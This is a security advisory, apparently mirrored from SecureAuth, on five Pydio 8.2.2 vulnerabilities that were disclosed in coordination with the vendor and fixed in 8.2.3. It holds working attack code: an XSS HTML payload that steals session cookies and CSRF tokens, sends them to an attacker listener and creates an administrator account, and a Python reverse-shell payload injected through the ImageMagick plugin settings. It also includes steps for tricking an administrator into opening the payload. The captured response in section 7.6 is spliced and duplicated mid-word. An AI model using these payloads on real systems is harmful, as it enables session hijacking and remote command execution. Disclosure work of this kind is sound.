@@ -1,0 +1,738 @@
+id: 32454
+date: 03/29/2019
+title: Pydio 8 Command Execution / Cross Site Scripting Vulnerabilities
+author: Leandro Cuozzo
+cves: CVE-2019-10045, CVE-2019-10046, CVE-2019-10047, CVE-2019-10048, CVE-2019-10049
+
+Pydio 8 Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: Pydio 8 Multiple Vulnerabilities
+Advisory ID: SAUTH-2019-0002
+Advisory URL:
+https://www.secureauth.com/labs/advisories/pydio-8-multiple-vulnerabilities
+Date published: 2019-03-28
+Date of last update: 2019-03-28
+Vendors contacted: Pydio
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Argument Injection or Modification [CWE-88], Argument Injection
+or Modification [CWE-88], Information Exposure [CWE-200], Improper
+Neutralization of Input During Web Page Generation
+('Cross-site Scripting') [CWE-79], Information Exposure [CWE-200],
+Information Exposure [CWE-200]
+Impact: Code execution, Security bypass, Information leak
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2019-10049, CVE-2019-10048, CVE-2019-10045, CVE-2019-10047,
+CVE-2019-10046, CVE-2019-10046
+
+3. *Vulnerability Description*
+Pydio [1] website states that:
+...Pydio, an open source EFSS (Enterprise File Synchronization and
+Sharing) solution that can be deployed On-Premise or in a Hybrid / Cloud
+environment. Pydio is available either through a Community distribution
+(Ideal for home use) that is free forever or an Enterprise which
+provides all the features, support and compliance to secure file sharing.
+Pydio is sold in more than 25 countries, from Cupertino to Singapore,
+and is used by leading brands around the world, such as Nikon, Credit
+Agricole, Dexia... Pydio also serves education and government clients,
+with major references such as Cambridge University (UK) and ADEME
+(France).
+
+Multiple vulnerabilities were found in Pydio 8 (latest version 8.2.2),
+which allows an attacker with regular user access to the application and
+by tricking an administrator account to open a shared URL bookmark
+through the application, to obtain the victim's session identifiers in
+order to impersonate him/her and to perform actions such as create a new
+user administrator account. After gaining privileged access to the
+application the attacker can leverage another vulnerability to perform
+OS command injection under the privileges of the user account running
+the web server.
+
+4. *Vulnerable Packages*
+
+. Pydio 8.2.2 - Latest version at the time of testing.
+. Older versions are probably affected too, but they were not checked.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Pydio published v8.2.3 that fixes all the reported vulnerabilities.
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Ramiro Molina
+from SecureAuth Security Consulting Services. The publication of this
+advisory was coordinated by Leandro Cuozzo from SecureAuth Advisories
+Team.
+
+7. *Technical Description / Proof of Concept Code*
+
+7.1. *Privilege escalation vector based in multiple vulnerabilities*
+
+[CVE-2019-10049]
+By chaining vulnerabilities it is possible for an attacker with regular
+user access to the web application to attempt to trick an administrator
+user to open a link shared through the application, that in turn opens a
+shared file that contains JavaScript code that is executed in the
+context of the victim user to obtain sensitive information such as
+session identifiers (session cookie and secure token) and perform
+actions on behalf of him/her.
+
+Note: if the targeted users are not administrators, any other action on
+behalf of that user could also be achieved, to for example obtain
+sensitive files stored in their accounts or impersonate them.
+
+Attack vector steps:
+
+1. Authenticated in the web application with a regular user account, go
+to "My Files" and upload a file named for example pydio_xss.html (use
+the .html extension) with the following content. The PoC once executed
+performs several requests to:
+
+. Obtain a "secure_token" for the user, which is a CSRF prevention token.
+. Obtain the session cookie for the current user.
+. Send the two sensitive tokens to the attacker, this allows to
+impersonate the victim user.
+. Change the "context to configuration".
+. Create a new user account named "admin99" with password "password1".
+. Change the user role of the created user to administrator.
+
+Note: change the IP address and port number (the example ones are the
+IP 192.168.56.1 and port 9999).
+
+PoC pydio_xss.html file:
+
+/-----
+<html>
+<body>
+<script type="text/javascript">
+console.log("Starting...");
+var req0 = new XMLHttpRequest();
+req0.open('GET', "/welcome/", true);
+req0.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+req0.send();
+req0.onload  = function() {
+var res =  req0.responseText.match(/SECURE_TOKEN.*?,/)[0];
+var secure_token = res.split(/"/)[2] ;
+var req1 = new XMLHttpRequest();
+  req1.open('POST', "index.php", true);
+  req1.setRequestHeader('Content-Type',
+'application/x-www-form-urlencoded');
+  req1.send("get_action=get_sess_id&secure_token=" + secure_token);
+  req1.onload  = function() {
+      var session_cookie = req1.responseText;
+      var req2 = new XMLHttpRequest();
+      req2.open('POST', "http://192.168.56.1:9999/creds", true);
+      req2.setRequestHeader('Content-Type',
+'application/x-www-form-urlencoded');
+      req2.send("Session Cookie: " + session_cookie + "; secure_token: "
++ secure_token);
+      req2.onload  = function() {
+          console.log("I just sent your protected session cookie.");
+      };
+      //switch "repository" to  configuration
+      var req3 = new XMLHttpRequest();
+      req3.open('POST', "/index.php", true);
+      req3.setRequestHeader('Content-Type',
+'application/x-www-form-urlencoded');
+     
+req3.send("get_action=switch_repository&repository_id=ajxp_conf&secure_token="
++ secure_token);
+      req3.onload  = function() {
+          console.log("Creating a new admin user...");
+          var req4 = new XMLHttpRequest();
+          req4.open('POST', "/index.php", true);
+          req4.setRequestHeader('Content-Type',
+'application/x-www-form-urlencoded');
+         
+req4.send("get_action=create_user&new_user_login=admin99&new_user_pwd=password1&group_path=&secure_token="
++ secure_token);
+          req4.onload  = function() {
+              console.log(req4.responseText);
+          console.log("Promoting user to admin...");
+          var req5 = new XMLHttpRequest();
+          req5.open('POST', "/index.php", true);
+          req5.setRequestHeader('Content-Type',
+'application/x-www-form-urlencoded');
+         
+req5.send("get_action=edit&sub_action=post_json_role&role_id=AJXP_USR_%2Fadmin99&json_data=%7B%22ROLE%22%3A%7B%22ACL%22%3A%7B%7D%2C%22MASKS%22%3A%7B%7D%2C%22ACTIONS%22%3A%7B%7D%2C%22PARAMETERS%22%3A%7B%7D%2C%22APPLIES%22%3A%7B%7D%2C%22USER%22%3A%7B%22LOCK%22%3Afalse%2C%22PROFILE%22%3A%22admin%22%2C%22ROLES%22%3A%5B%22AJXP_GRP_%2F%22%2C%22AJXP_USR_%2Fadmin99%22%5D%7D%7D%2C%22METADATA%22%3A%7B%7D%2C%22USER%22%3A%7B%22LOCK%22%3Afalse%2C%22PROFILE%22%3A%22admin%22%2C%22ROLES%22%3A%5B%22AJXP_GRP_%2F%22%2C%22AJXP_USR_%2Fadmin99%22%5D%7D%7D&secure_token="
++ secure_token);
+          req5.onload  = function() {
+              console.log(req5.responseText);
+              };
+          };
+      };
+  };
+};
+</script>
+</body>
+</html>
+-----/
+
+2. Still in "My Files" create a new URL bookmark with the following URL
+and a label of your choice. Note that selecting a good label can help
+into tricking an administrator user into opening the bookmark. The URL
+must reference the filename uploaded in the previous step. For this
+example, the file is named '"pydio_xss.html"':
+
+/-----
+http://192.168.56.102/index.php?get_action=open_file&repository_id=inbox&file=%2Fpydio_xss.html
+-----/
+
+3. Select each the uploaded HTML file and share it with the administrator
+user account by clicking on share and in the popup, window select the
+target user (or users if the administrator account is not known) and
+click on save.
+
+4. Do the same with the URL Bookmark and share it with the victim
+administrator user/s.
+
+5. On a command prompt with for example ncat set a listener for the
+incoming post request with the session identifiers.
+
+6. Once the administrator opens the URL Bookmark the JavaScript code in
+the uploaded file will be executed, the session identifiers will be
+posted to the attacker's machine and a new administrator user (named
+"admin99" with password "password1") will be created.
+
+7. The attacker can login with the created administrator user or can
+leverage the session identifiers to impersonate the victim user.
+
+Note: after gaining access as an administrator to the web application an
+attacker can leverage the OS command injection vulnerability described
+in this advisory to run system commands on the underling operative
+system with the local user running the web server.
+
+7.2. *OS command injection by parameter abuse in ImageMagick plugin*
+
+[CVE-2019-10048]
+The 'ImageMagick' plugin that is installed by default in Pydio 8.2.2
+does not perform the appropriate validation and sanitization of user
+supplied input in the plugin's configuration options allowing arbitrary
+shell commands to be entered that result in command execution on the
+underlying operative system with the privileges of the local user
+running the web server. The attacker will need to be authenticated into
+the application with an administrator user account in order to be able
+to edit the affected plugin configuration. In this advisory a privilege
+escalation vector by levering other vulnerabilities from a regular user
+standpoint is also described.
+
+Proof of Concept:
+
+1. Logged in with an administrator account into the web application,
+go to Settings -> Editors.
+
+2. Disable the PDF Viewer plugin.
+
+3. Enable the ImageMagick plugin.
+
+4. Click on Edit ImageMagick plugin settings.
+
+5. In the popup window, add at the end of the current settings for the
+"Thumbs options" and "Images options" parameters the following example
+payload to run a python reverse shell (where in the example the IP
+address is 192.168.56.1 and the port number is 9999, edit accordingly)
+and save the settings. An example payload is:
+
+/-----
+; python -c 'import
+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.56.1",9999));os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);';
+-----/
+
+6. On a command prompt with for example ncat set a listener for the
+incoming reverse shell.
+
+7. With the administrator account, or any other account upload a test
+PDF file to a workspace and observe that a reverse shell is received.
+
+Affected source code:
+
+The affected source code section is located in the file:
+'"plugins/editor.imagick/IMagickPreviewer.php" line #380'. The following
+code section is where the vulnerability is located. Note that the user
+provided parameters are not validated and sanitized before construction
+the "$cmd" string an being passed to the exec() function.
+
+/-----
+$customOptions = $this->getContextualOption($ctx, "IM_CUSTOM_OPTIONS");
+$customEnvPath = $this->getContextualOption($ctx, "ADDITIONAL_ENV_PATH");
+$viewerQuality = $this->getContextualOption($ctx, "IM_VIEWER_QUALITY");
+$thumbQuality = $this->getContextualOption($ctx, "IM_THUMB_QUALITY");
+if (empty($customOptions)) {
+    $customOptions = "";
+}
+if (!empty($customEnvPath)) {
+    putenv("PATH=".getenv("PATH").":".$customEnvPath);
+}
+$params = $customOptions." ".( $this->extractAll? $viewerQuality :
+$thumbQuality );
+$cmd = $this->getContextualOption($ctx, "IMAGE_MAGICK_CONVERT")."
+".$params." ".escapeshellarg(($masterFile).$pageLimit)."
+".escapeshellarg($tmpFileThumb);
+$this->logDebug("IMagick Command : $cmd");
+session_write_close(); // Be sure to give the hand back
+exec($cmd, $out, $return);
+-----/
+
+7.3. *Current user AjaXplorer session cookie value disclosure*
+
+[CVE-2019-10045]
+The 'AjaXplorer' session cookie is correctly set with the 'HTTPOnly'
+flag to prevent access to its value from scripts. The affected "action"
+'get_sess_id' discloses the session cookie value in the response body
+enabling scripts to get access to its value. This identifier can be
+reused by an attacker to impersonate a user and perform actions on
+behalf of him/her if the session is still active.
+
+Proof of Concept:
+
+The response to the following HTTP POST request with the parameter
+'get_action=get_sess_id' returns the current user session identifier
+('AjaXplorer' session cookie value) in the response.
+
+Request:
+
+/-----
+POST /index.php? HTTP/1.1
+Host: 192.168.56.101
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.56.101/ws-inbox/
+content-type: application/x-www-form-urlencoded; charset=UTF-8
+origin: http://192.168.56.101
+Content-Length: 68
+Connection: close
+Cookie: AjaXplorer=1ln7fa60h1ajsapm7ha45sge26; ajxp_licheck=ok
+
+get_action=get_sess_id&secure_token=zZ6lpJaRUovEYm0imb839L8YhWI1UHZK
+-----/
+
+Response:
+
+/-----
+HTTP/1.1 200 OK
+Date: Wed, 30 Jan 2019 22:21:18 GMT
+Server: Apache/2.4.27 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+X-Powered-By: PHP/5.6.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 26
+
+1ln7fa60h1ajsapm7ha45sge26
+-----/
+
+7.4. *Stored Cross-site scripting (XSS) in file view feature*
+
+[CVE-2019-10047]
+A stored cross-site scripting vulnerability exists in the affected web
+application that can be exploited by levering the file upload and file
+preview features of the application. An authenticated attacker can
+upload an HTML file containing Javascript code and afterword's a file
+preview URL can be used to access the uploaded file.
+If a malicious user shares an uploaded HTML file containing JavaScript
+code with another user of the application and tricks an authenticated
+victim into accessing an URL (i.e. by clicking in a link) that results
+in the HTML code being interpreted by the web browser and the included
+JavaScript code being executed under the context of the victim user
+session.
+
+Proof of Concept:
+
+With an authenticated user go to "My Files" and upload a HTML file as
+the following PoC, which is named for example "xss.html":
+
+/-----
+<html>
+<body>
+<script type="text/javascript">
+alert("SecureAuth");
+</script>
+</body>
+</html>
+-----/
+
+In another tab of the web browser access the following URL, and notice
+that the JavaScript code is executed, and a popup alert is displayed:
+
+/-----
+http://192.168.56.102/index.php?secure_token=&get_action=open_file&repository_id=1&file=%2Fxss.html
+-----/
+
+Request:
+
+/-----
+GET
+/index.php?secure_token=&get_action=open_file&repository_id=1&file=%2Fxss.html
+HTTP/1.1
+Host: 192.168.56.102
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: AjaXplorer=gdn92c6maohf28lt2noiso1891; ajxp_licheck=ok
+Upgrade-Insecure-Requests: 1
+-----/
+
+Response:
+
+/-----
+HTTP/1.1 200 OK
+Date: Wed, 30 Jan 2019 22:00:21 GMT
+Server: Apache/2.4.34 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+X-Powered-By: PHP/5.6.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: public
+Pragma: no-cache
+Content-Disposition: inline; filename="xss.html"
+Content-Length: 66
+Connection: close
+Content-Type: text/html; charset=us-ascii; name="xss.html"
+
+<html>
+<body>
+<script>alert("SecureAuth")</script>
+</body>
+</html>
+-----/
+
+Share the file with an administrator user, and logged in with that user
+account access the "Shared Files" repository and in another tab, access
+following URL and notice that the JavaScript code is also executed:
+
+/-----
+http://192.168.56.102/index.php?get_action=open_file&repository_id=inbox&file=%2Fxss.html
+-----/
+
+Request:
+
+/-----
+GET /index.php?get_action=open_file&repository_id=inbox&file=%2Fxss.html
+HTTP/1.1
+Host: 192.168.56.102
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: AjaXplorer=6vh2o75udh253f6lu8p99cpmr5; ajxp_licheck=ok
+Upgrade-Insecure-Requests: 1
+-----/
+
+Response:
+
+/-----
+HTTP/1.1 200 OK
+Date: Wed, 30 Jan 2019 22:01:05 GMT
+Server: Apache/2.4.34 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+X-Powered-By: PHP/5.6.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: public
+Pragma: no-cache
+Content-Disposition: inline; filename="xss.html"
+Content-Length: 66
+Connection: close
+Content-Type: text/html; charset=us-ascii; name="xss.html"
+
+<html>
+<body>
+<script>alert("SecureAuth")</script>
+</body>
+</html>
+-----/
+
+7.5. *Unauthenticated Pydio and PHP libraries versions information
+disclosure*
+
+[CVE-2019-10046]
+An unauthenticated attacker can obtain information about the Pydio
+version and PHP libraries and their versions by performing a HTTP POST
+request to '/index.php' and including the parameters
+'"get_action=display_doc& doc_file=CREDITS"' in the body.
+
+Proof of Concept:
+
+Request:
+
+/-----
+POST /index.php? HTTP/1.1
+Host: 192.168.56.102
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.56.102/welcome/
+content-type: application/x-www-form-urlencoded; charset=UTF-8
+origin: http://192.168.56.102
+Content-Length: 53
+Connection: close
+Cookie: AjaXplorer=a; ajxp_licheck=ok
+
+get_action=display_doc&doc_file=CREDITS&secure_token=
+-----/
+
+Response:
+
+/-----
+HTTP/1.1 200 OK
+Date: Wed, 30 Jan 2019 22:26:49 GMT
+Server: Apache/2.4.27 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+X-Powered-By: PHP/5.6.25
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+Pragma: no-cache
+Connection: close
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 9246
+
+<img src="plugins/gui.ajax/PydioLogo250.png"/>
+<br><div style="padding-left:10px;"><div
+style="font-size:0.8em;">Version 8.2.2 - 2018-10-10
+<br>Copyright 2007-2017 Abstrium SAS
+<br>The latest code can be found at https://pydio.com/.
+<br></div>
+...
+TRUNCATED
+...
+<br>
+<br><div class="title">PHP Libraries</div>
+<br>
+<br>    aws/aws-sdk-php                    3.19.18             Apache-2.0
+<br>    commerceguys/guzzle-oauth2-plugin  v2.1.1              MIT
+<br>    dapphp/securimage                  3.6.4               BSD
+<br>    davegardnerisme/nsqphp             dev-master 60f12ad  none
+<br>    evenement/evenement                v2.0.0              MIT
+<br>    firebase/php-jwt                   v2.2.0              BSD-3-Clause
+<br>    gimler/guzzle-description-loader   v0.0.4              MIT
+<br>    guzzlehttp/command                 0.7.1               MIT
+<br>    guzzlehttp/guzzle                  5.3.1               MIT
+<br>    guzzlehttp/guzzle-services         0.5.0               MIT
+<br>    guzzlehttp/promises                1.2.0               MIT
+<br>    guzzlehttp/psr7                    1.3.1               MIT
+<br>    guzzlehttp/ringphp                 1.1.0               MIT
+<br>    guzzlehttp/streams                 3.0.0               MIT
+<br>    meenie/javascript-packer           1.1                 LGPL 2.1
+<br>    mtdowling/jmespath.php             2.3.0               MIT
+<br>    nikic/fast-route                   v1.0.1              BSD-3-Clause
+<br>    phpseclib/phpseclib                2.0.3               MIT
+<br>    psr/http-message                   1.0.1               MIT
+<br>    psr/log                            1.0.2               MIT
+<br>    react/cache                        v0.4.1              MIT
+<br>    react/child-process                v0.4.1              MIT
+<br>    react/dns                          v0.4.3              MIT
+<br>    react/event-loop                   v0.4.2              MIT
+<br>    react/http                         v0.4.1              MIT
+<br>    react/http-client                  v0.4.13             MIT
+<br>    react/promise                      v2.4.1              MIT
+<br>    react/react                        v0.4.2              MIT
+<br>    react/socket                       v0.4.3              MIT
+<br>    react/socket-client                v0.4.5              MIT
+<br>    react/stream                       v0.4.4              MIT
+<br>    sabre/dav                          1.8.10              BSD-3-Clause
+<br>    sabre/vobject                      2.1.7               BSD-3-Clause
+<br>    symfony/config                     v3.1.5              MIT
+<br>    symfony/console                    v3.1.5              MIT
+<br>    symfony/debug                      v3.1.5              MIT
+<br>    symfony/filesystem                 v3.1.5              MIT
+<br>    symfony/polyfill-mbstring          v1.2.0              MIT
+<br>    symfony/yaml                       v3.1.5              MIT
+<br>    zendframework/zend-diactoros       1.3.7               BSD-2-Clause
+<br>
+<br>
+<br><div class="title">Other Plugins</div>
+<br>    PThumb.php <a target="_blank"
+href="http://www.phpclasses.org">http://www.phpclasses.org</a> (LPGL)
+<br>    OpenLayers <a target="_blank"
+href="http://www.openlayers.org">http://www.openlayers.org</a> (BSD)
+<br>    Video-js <a target="_blank"
+href="http://www.videojs.com/">http://www.videojs.com/</a> (LGPL)
+<br>    Zend Lucene <a target="_blank"
+href="http://www.zend.com/">http://www.zend.com/</a> (New BSD)
+<br>    SoundManager : <a target="_blank"
+href="http://www.schillmania.com/projects/soundmanager2/">http://www.schillmania.com/projects/soundmanager2/</a>
+(BSD)
+<br>    CAS Driver (Apache 2): https://github.com/Jasig/phpCAS
+<br>
+<br></div>
+-----/
+
+7.6. *Unauthenticated Pydio "Boot Config" information disclosure*
+
+[CVE-2019-10046]
+An unauthenticated attacker can obtain information about the Pydio
+configuration including session timeout and license information by
+performing a HTTP GET request to '"/index.php?get_action=get_boot_conf"'.
+
+Proof of Concept:
+
+Request:
+
+/-----
+GET /index.php?get_action=get_boot_conf HTTP/1.1
+Host: 192.168.56.102
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0)
+Gecko/20100101 Firefox/64.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+-----/
+
+Response:
+
+/-----
+  HTTP/1.1 200 OK
+  Date: Wed, 30 Jan 2019 22:42:53 GMT
+  Server: Apache/2.4.34 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+  X-Powered-By: PHP/5.6.25
+  Set-Cookie: AjaXplorer=170a2docpbgl1509b2v98m90e3; path=/; HttpOnly
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+  Pragma: no-cache
+  Set-Cookie: AJXP_GUI=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT;
+Max-Age=0
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 136855
+  {
+    "ajxpResourcesFolder": "plugins/gui.ajax/res",
+    "ajxpServerAccess": "index.php",
+    "zipEnabled": true,
+    "multipleFilesDownloadEnabled": true,
+    "customWording": {
+      "welcomeMessage": "My Company File Sharing Platform",
+      "title": "Pydio Enterprise",
+      "icon": "plugins/gui.ajax/res/themes/common/images/LoginBoxLogo.png",
+      "iconWidth": "250px",
+      "iconHeight": "120px",
+      "iconOnly": true,
+      "titleFontSize": ""
+    },
+    "usersEnabled": true,
+    "loggedUser": false,
+    "currentLanguage": "en",
+    "session_timeou      Date: Wed, 30 Jan 2019 22:42:53 GMT
+  Server: Apache/2.4.34 (Red Hat) OpenSSL/1.0.2k-fips PHP/5.6.25
+  X-Powered-By: PHP/5.6.25
+  Set-Cookie: AjaXplorer=170a2docpbgl1509b2v98m90e3; path=/; HttpOnly
+  Expires: Thu, 19 Nov 1981 08:52:00 GMT
+  Cache-Control: no-store, no-cache, must-revalidate, post-check=0,
+pre-check=0
+  Pragma: no-cache
+  Set-Cookie: AJXP_GUI=deleted; expires=Thu, 01-Jan-1970 00:00:01 GMT;
+Max-Age=0
+  Connection: close
+  Content-Type: application/json
+  Content-Length: 136855
+  {
+    "ajxpResourcesFolder": "plugins/gui.ajax/res",
+    "ajxpServerAccess": "index.php",
+    "zipEnabled": true,
+    "multipleFilesDownloadEnabled": true,
+    "customWording": {
+      "welcomeMessage": "My Company File Sharing Platform",
+      "title": "Pydio Enterprise",
+      "icon": "plugins/gui.ajax/res/themes/common/images/LoginBoxLogo.png",
+      "iconWidth": "250px",
+      "iconHeight": "120px",
+      "iconOnly": true,
+      "titleFontSize": ""
+    },
+    "usersEnabled": true,
+    "loggedUser": false,
+    "currentLanguage": "en",
+    "session_timeout": 1440,
+    "client_timeout": 1440,
+    "client_timeout_warning": 3,
+
+  ...
+  TRUNCATED
+  ...
+
+      "helper_booster.updater.force.2": "force reinstall",
+      "helper_booster.updater.force.3": "?"
+    },
+    "SECURE_TOKEN": "OCGdu2uIsEJUWYPHaPOV5V35pNPhSuDz",
+    "streaming_supported": "true",
+    "theme": "material",
+    "ajxpImagesCommon": true,
+    "licence_features": [
+      "TRIAL",
+      "footer",
+      "splash",
+      "customCopyright:<a href='https://pydio.com'>Pydio Enterprise
+Distribution</a> - Trial version valid until 2019-02-20."
+    ]
+  }t": 1440,
+    "client_timeout": 1440,
+    "client_timeout_warning": 3,
+
+  ...
+  TRUNCATED
+  ...
+
+      "helper_booster.updater.force.2": "force reinstall",
+      "helper_booster.updater.force.3": "?"
+    },
+    "SECURE_TOKEN": "OCGdu2uIsEJUWYPHaPOV5V35pNPhSuDz",
+    "streaming_supported": "true",
+    "theme": "material",
+    "ajxpImagesCommon": true,
+    "licence_features": [
+      "TRIAL",
+      "footer",
+      "splash",
+      "customCopyright:<a href='https://pydio.com'>Pydio Enterprise
+Distribution</a> - Trial version valid until 2019-02-20."
+    ]
+  }
+-----/
+
+8. *Report Timeline*
+2019-02-11: SecureAuth sent an initial notification to Pydio including
+a draft advisory.
+2019-02-11: Pydio confirmed the reception of the advisory.
+2019-02-15: Pydio informed they were testing the vulnerabilities and
+they will answer back next week.
+2019-02-15: SecureAuth thanked the update.
+2019-02-20: Pydio requested a clarification about some vulnerabilities.
+2019-02-21: SecureAuth sent additional information to Pydio.
+2019-03-08: SecureAuth requested an update.
+2019-03-08: Pydio replied saying they were planning to release their
+fix next week and asked. SecureAuth to test this new version.
+2019-03-08: SecureAuth thanked the update and agreed to test the new
+version.
+2019-03-12: Pydio sent the fixed version.
+2019-03-15: Pydio asked for an update and proposed to release its fix on
+Tuesday 19th.
+2019-03-15: SecureAuth informed Pydio that the fixed version was tested
+and all the reported vulnerabilities were addressed. In addition,
+SecureAuth proposed to postpone the release date to Thursday 21th.
+2019-03-18: Pydio thanked the answer and agreed on the proposal.
+2019-03-21: Pydio released the version 8.2.3
+2019-03-28: Advisory SAUTH-2019-0002 published.
+
+9. *References*
+
+[1] https://pydio.com/en/about-us
+
+#  0day.today [2023-03-25]  #
